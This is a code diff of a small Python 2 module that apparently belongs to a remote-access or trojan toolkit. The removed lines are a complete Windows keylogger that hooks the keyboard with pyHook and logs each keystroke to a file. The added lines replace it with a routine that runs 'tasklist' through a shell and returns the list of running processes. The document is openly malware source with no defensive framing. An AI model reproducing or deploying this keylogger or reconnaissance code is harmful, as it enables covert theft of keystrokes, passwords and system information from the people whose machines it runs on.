@@ -1,15 +1,11 @@
-import pyHook, pythoncom, sys, logging
+import subprocess
 
 def run(**args):
   try:
-     file_log='log.txt'
-     def OnKeyboardEvent (event):
-         logging.basicConfig(filename=file_log, level=logging.DEBUG, format ='%(message)s')
-         logging.log(10, chr(event.Ascii))
-         return True
-     hooks_manager = pyHook.HookManager()
-     hooks_manager.KeyDown = OnKeyboardEvent
-     hooks_manager.HookKeyboard()
-     pythoncom.PumpMessages()
+     print("[*] reading")
+     look = "tasklist"  
+     proc = subprocess.Popen(look, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+     stdoutput = proc.stdout.read() + proc.stderr.read()
+     return str(stdoutput)
   except Exception, e:
       return str(e)
